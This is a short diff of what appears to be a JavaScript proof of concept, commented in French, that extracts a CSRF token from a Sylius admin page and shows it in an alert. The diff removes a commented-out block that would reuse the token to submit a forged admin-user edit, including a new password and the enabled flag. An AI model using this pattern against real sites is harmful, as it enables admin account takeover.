@@ -50,28 +50,7 @@
 
     // 4a) PoC visuel
     alert('CSRF token = ' + token);
-
-    // 4b) (optionnel) Automatiser une modification comme le ferait le formulaire
-    //     -> décommente si c’est TON site et que tu veux soumettre :
-    /*
-    const formData = new FormData();
-    formData.set('_method', 'PUT'); // si ton framework l’utilise
-    formData.set('sylius_admin_user[username]', 'Alice');      // adapte les noms
-    formData.set('sylius_admin_user[email]', 'alice@example.com');
-    formData.set('sylius_admin_user[plainPassword]', 'Pwd!234567890');
-    formData.set('sylius_admin_user[enabled]', '1');
-    formData.set('sylius_admin_user[firstName]', 'Alice');
-    formData.set('sylius_admin_user[lastName]', 'Doe');
-    formData.set('sylius_admin_user[localeCode]', 'en_US');
-    formData.set('sylius_admin_user[_token]', token);
-
-    const submitResp = await fetch(editHref, {
-      method: 'POST',
-      credentials: 'include',
-      body: formData
-    });
-    console.log('Submit status', submitResp.status);
-    */
+    
   } catch (err) {
     console.error(err);
     alert('Erreur: ' + (err?.message || err));
